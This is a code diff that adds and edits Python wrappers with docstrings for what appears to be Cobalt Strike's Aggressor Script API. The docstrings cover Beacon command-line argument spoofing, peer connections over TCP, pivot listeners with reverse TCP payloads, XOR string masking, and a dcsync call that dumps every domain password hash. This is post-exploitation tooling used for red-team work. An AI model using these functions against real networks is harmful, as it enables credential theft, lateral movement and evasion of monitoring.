@@ -330,6 +330,57 @@ def artifact_stageless(*args, fork=False):
     return engine.call('artifact_stageless', args, fork=fork)
 
 
+def bargue_add(*args, fork=False):
+    r"""    
+    This function adds an option to Beacon's list of commands to spoof arguments for.
+    Arguments
+    $1 - the id for the beacon. This may be an array or a single ID.
+    $2 - the command to spoof arguments for. Environment variables are OK here too.
+    $3 - the fake arguments to use when the specified command is run.
+    Notes
+    The process match is exact. If Beacon tries to launch "net.exe", it will not match net, NET.EXE, or c:\windows\system32\net.exe. It will only match net.exe.
+    x86 Beacon can only spoof arguments in x86 child processes. Likewise, x64 Beacon can only spoof arguments in x64 child processes.
+    The real arguments are written to the memory space that holds the fake arguments. If the real arguments are longer than the fake arguments, the command launch will fail.
+    Example
+    
+    # spoof cmd.exe arguments.
+    bargue_add($1, "%COMSPEC%", "/K \"cd c:\windows\temp & startupdatenow.bat\"");
+    
+    # spoof net arguments
+    bargue_add($1, "net", "user guest /active:no");
+    """
+
+    return engine.call('bargue_add', args, fork=fork)
+
+
+def bargue_list(*args, fork=False):
+    r"""    
+    List the commands + fake arguments Beacon will spoof arguments for.
+    Arguments
+    $1 - the id for the beacon. This may be an array or a single ID.
+    Example
+    
+    bargue_list($1);
+    """
+
+    return engine.call('bargue_list', args, fork=fork)
+
+
+def bargue_remove(*args, fork=False):
+    r"""    
+    This function removes an option to Beacon's list of commands to spoof arguments for.
+    Arguments
+    $1 - the id for the beacon. This may be an array or a single ID.
+    $2 - the command to spoof arguments for. Environment variables are OK here too.
+    Example
+    
+    # don't spoof cmd.exe
+    bargue_remove($1, "%COMSPEC%");
+    """
+
+    return engine.call('bargue_remove', args, fork=fork)
+
+
 def base64_decode(*args, fork=False):
     r"""    
     Unwrap a base64-encoded string
@@ -486,6 +537,20 @@ def bclear(*args, fork=False):
     return engine.call('bclear', args, fork=fork)
 
 
+def bconnect(*args, fork=False):
+    r"""    
+    Ask Beacon (or SSH session) to connect to a Beacon peer over a TCP socket
+    Arguments
+    $1 - the id for the beacon. This may be an array or a single ID.
+    $2 - the target to connect to
+    Example
+    
+    bconnect($1, "DC");
+    """
+
+    return engine.call('bconnect', args, fork=fork)
+
+
 def bcovertvpn(*args, fork=False):
     r"""    
     Ask Beacon to deploy a Covert VPN client.
@@ -538,10 +603,16 @@ def bdcsync(*args, fork=False):
     Arguments
     $1 - the id for the beacon. This may be an array or a single ID.
     $2 - fully qualified name of the domain
-    $3 - DOMAIN\user to pull hashes for
+    $3 - DOMAIN\user to pull hashes for (optional)
+    Notes
+    If $3 is left out, dcsync will dump all domain hashes.
     Example
     
+    # dump a specific account
     bdcsync($1, "PLAYLAND.testlab", "PLAYLAND\\Administrator");
+    
+    # dump all accounts
+    bdcsync($1, "PLAYLAND.testlab");
     """
 
     return engine.call('bdcsync', args, fork=fork)
@@ -603,6 +674,7 @@ def bdllspawn(*args, silent=False, fork=False):
     $3 - a parameter to pass to the DLL
     $4 - a short description of this post exploitation job (shows up in jobs output)
     $5 - how long to block and wait for output (specified in milliseconds)
+    $6 - true/false; use impersonated token when running this post-ex job?
     Notes
     This function will spawn an x86 process if the Reflective DLL is an x86 DLL. Likewise, if the Reflective DLL is an x64 DLL, this function will spawn an x64 process.
     A well-behaved Reflective DLL follows these rules:
@@ -648,7 +720,7 @@ def bdllspawn(*args, silent=False, fork=False):
     Example (Aggressor Script)
     
     alias hello {
-    	bdllspawn($1, script_resource("reflective_dll.dll"), $2, "test dll", 5000);
+    	bdllspawn($1, script_resource("reflective_dll.dll"), $2, "test dll", 5000, false);
     }
     """
 
@@ -1459,7 +1531,7 @@ def bmode(*args, fork=False):
     Change the data channel for a DNS Beacon.
     Arguments
     $1 - the id for the beacon. This may be an array or a single ID.
-    $2 - the data channel (e.g., dns, dns6, dns-txt, http, and smb)
+    $2 - the data channel (e.g., dns, dns6, dns-txt, or http)
     Example
     
     item "Mode DNS-TXT" {
@@ -2306,7 +2378,7 @@ def btimestomp(*args, silent=False, fork=False):
 
 def bunlink(*args, fork=False):
     r"""    
-    Ask Beacon to delink a Beacon its connected to over a named pipe.
+    Ask Beacon to delink a Beacon its connected to over a TCP socket or named pipe.
     Arguments
     $1 - the id for the beacon. This may be an array or a single ID.
     $2 - the target host to unlink (specified as an IP address)
@@ -3228,6 +3300,38 @@ def listener_info(*args, fork=False):
     """
 
     return engine.call('listener_info', args, fork=fork)
+
+
+def listener_pivot_create(*args, fork=False):
+    r"""    
+    Create a new pivot listener.
+    Arguments
+    $1 - the Beacon ID
+    $2 - the listener name
+    $3 - the payload (e.g., windows/beacon_reverse_tcp)
+    $4 - the listener host
+    $5 - the listener port
+    Note
+    The only valid payload argument is windows/beacon_reverse_tcp.
+    Example
+    
+    # create a pivot listener:
+    # $1 = beaconID, $2 = name, $3 = port
+    alias plisten {
+    	local('$lhost $bid $name $port');
+    
+    	# extract our arguments
+    	($bid, $name, $port) = @_;
+    
+    	# get the name of our target
+    	$lhost = beacon_info($1, "computer");
+    
+    	btask($1, "create TCP listener on $lhost $+ : $+ $port");
+    	listener_pivot_create($1, $name, "windows/beacon_reverse_tcp", $lhost, $port);
+    }
+    """
+
+    return engine.call('listener_pivot_create', args, fork=fork)
 
 
 def listener_restart(*args, fork=False):
@@ -4651,6 +4755,23 @@ def str_encode(*args, fork=False):
     """
 
     return engine.call('str_encode', args, fork=fork)
+
+
+def str_xor(*args, fork=False):
+    r"""    
+    Walk a string and XOR it with the provided key.
+    Arguments
+    $1 - the string to mask
+    $2 - the key to use (string)
+    Returns
+    The original string masked with the specified key.
+    Example
+    
+    $mask  = str_xor("This is a string", "key");
+    $plain = str_xor($mask, "key");
+    """
+
+    return engine.call('str_xor', args, fork=fork)
 
 
 def sync_download(*args, fork=False):
